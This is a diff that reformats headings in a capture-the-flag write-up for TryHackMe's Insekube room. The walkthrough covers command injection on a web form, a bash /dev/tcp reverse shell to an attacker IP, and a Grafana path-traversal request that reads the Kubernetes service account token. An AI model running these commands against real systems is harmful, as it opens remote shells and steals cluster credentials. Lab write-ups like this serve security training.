@@ -1,13 +1,13 @@
-<a href="https://tryhackme.com/room/insekube"> Insekube </a>
-Exploiting Kubernetes by leveraging a Grafana LFI vulnerability
+# <a href="https://tryhackme.com/room/insekube"> Insekube </a>
+### Exploiting Kubernetes by leveraging a Grafana LFI vulnerability
 
-Task 1
+### Task 1
 
 nmap -p- -Pn -sC -sT -A --reason -o nmap.scan [Target IP]
 This will give us answer rot the first question.
 
 
-Task 2
+### Task 2
 
 On website we can perform a command injection attack by typing various command like ;whoami ;id ;ls
 Author tells us that flag is in Envrometal variable so lets  type ;printenv
@@ -18,16 +18,16 @@ There is no netcat or python avaliable on machine for us to use.
 We have to use Command injection attack again
 127.0.0.1 && bash &>/dev/tcp/[Attacker IP]/[PORT] <&1
 
-Task 3
+### Task 3
 
 No answer needed
 
-Task 4
+### Task 4
 
 We have access to the machine. All we need to do is follow instructions. 
 Flag is there, you can analyse it with online tools
 
-Task 5
+### Task 5
 
 Running env you will see there is a Grafana service running in the cluster.
 We need to find what version of Grafana is used and search for vulnerabilities
@@ -35,7 +35,7 @@ Still in console that is connected to the target machine
 curl http://grafana:3000/login/ - Text is long but it is easy to find ;)
  
 
-Task 6
+### Task 6
 
 I had trouble with running exploit but when googling around I have found solution
 curl --path-as-is http://grafana:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
@@ -43,7 +43,7 @@ Now we have token
 To get service account name we can use option "get serviceaccount" and token that we have found
 To get next two answers all we need to do is fllow instruction. Flag 3 is in same place as flag 1
 
-Task 7
+### Task 7
 
 First we need to prepare .yaml file
 
